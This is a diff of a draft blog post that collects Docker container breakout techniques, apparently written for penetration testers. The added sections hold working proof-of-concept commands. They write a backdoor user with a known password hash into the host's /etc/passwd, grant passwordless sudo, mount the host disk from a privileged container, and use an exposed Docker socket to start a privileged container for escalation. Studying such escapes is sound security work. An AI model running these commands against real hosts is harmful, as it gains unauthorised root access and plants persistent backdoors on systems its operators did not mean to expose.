@@ -3,7 +3,6 @@ title: "Container Breakouts Techniques"
 date: 2020-07-11T13:09:54+02:00
 draft: true
 ---
-
 Basic Container Breakouts
 ## Intro
 The motivation of this post is to collect container breakouts. I was considering writing a huge post about all the stuff you must know to break out of container. But, if I would do so, it will take ages to write, es well to read and at the end you would just scroll direct to the PoC code snippets. So I dropped that idea and will just link to additional readings.
@@ -24,14 +23,19 @@ To escalate to the host, we create a user in the file `/hostfs/etc/passwd` and a
 
 ```
 # cat /hostfs/etc/passwd | grep 1000
-user:x:1000:1000::/home/user:/bin/bash
+user:x:1000:1001:user:/home/user:/usr/bin/zsh
+
 # openssl passwd -6 -salt xyz test
 $6$xyz$rjarwc/BNZWcH6B31aAXWo1942.i7rCX5AT/oxALL5gCznYVGKh6nycQVZiHDVbnbu0BsQyPfBgqYveKcCgOE0
+
 # echo 'foo:$6$xyz$rjarwc/BNZWcH6B31aAXWo1942.i7rCX5AT/oxALL5gCznYVGKh6nycQVZiHDVbnbu0BsQyPfBgqYveKcCgOE0:1000:1001:user:/home/user:/usr/bin/zsh' | tee -a /hostfs/etc/passwd
+
 # echo "user ALL=(ALL) NOPASSWD: ALL" >> /hostfs/etc/sudoers.d/0-user
+
 # ip r 
 default via 172.17.0.1 dev eth0 
 172.17.0.0/16 dev eth0 proto kernel scope link src 172.17.0.2
+
 # ssh -l foo 127.0.0.1
 foo@127.0.0.1's password: 
 Last login: Sat Jul 11 12:10:10 2020 from 127.0.0.1
@@ -39,7 +43,7 @@ arch [~]% sudo -i
 [arch ~]# 
 ```
 
-We have assumed that there is a SSH daemon running on the host, the service is not hardened and the `sudo` package was installed. Well, you could exchange the sudo step by creating another user with uid 0 to get rid of that step, nut anyway ;)
+We have assumed that there is a SSH daemon running on the host, the service is not hardened and the `sudo` package was installed. Well, you could exchange the sudo-step by creating another user with `uid=0(root)` to get rid of that step, but anyway ;)
 
 #### Cronjob
 
@@ -72,6 +76,14 @@ In this second showcase, we assumed that a cron service was running on the host.
 If you start a container with Docker and you add the flag `--privileged` that means to the process in the container can act as root user on the host. The containerization would have the advantage of self-containing software shipment, but no real security boundaries to the kernel.
 There are plenty ways to escape from a privileged container. Let’s have a start.
 
+#### Capabilities
+
+##### `CAP_SYS_Module` – Load Kernel Module 
+https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host 
+
+##### `CAP_SYS_ADMIN` – cgroup release on notfy
+TODO … have to read :D
+
 #### Host devices
 
 I prefer to use the host devices to escape from a privileged container. A quick directory listing of the devices in the container shows that we have access to all of them:
@@ -100,24 +112,22 @@ lrwxrwxrwx   1 root root     7 Nov 19  2019 sbin -> usr/bin
 […]
 drwxr-xr-x  10 root root  4096 May 26 14:37 usr
 […]
+# mkdir /hostfs
+# mount /dev/sda1 /hostfs
 ```
 As you can see, the hard drive itself is listed, which can be mounted. After mounting the device, it is possible to interact as root user with the device and backdoor the system.
 Getting access via the hard drive is already described in the previous section [Shared Host root-directory](#shared-host-root-directory).
 
 
-#### cgroups
-TODO … have to read :D
-
 ### Docker Socket
 
-Finde Docker Socket
-Starte privileged Container
-
-### Capabilities
-
-#### `CAP_SYS_Module` – Load Kernel Module 
-
-
-
-
+You know, every time you have access to the Docker Socket (default location: `/var/run/docker.sock`) it means that you are root on the host. Some containerized application may need access to the socket, e.g., for observation or local system management.
+You have read correctly, local system management. As soon you have access to the socket, you can manage the local system. Okay, first at all, you can manage containers and these containers can afterwards manage the system. 
+So if you want to escalate from the container to the system, you can interact with the Docker Socket manually or just simple install Docker in the container. Okay, and what’s the next step? Exactly, you had it already in your mind, start a privileged container. 
+```
+# apt update && apt install -y docker.io
+# docker run --rm --privileged -it nodyd/ana bash
+user@b89e2cfbd699:~$
+```
+With  access to a privileged container, you can perform the steps as already explained in previous section [Privileged Container](#privileged-container).
 
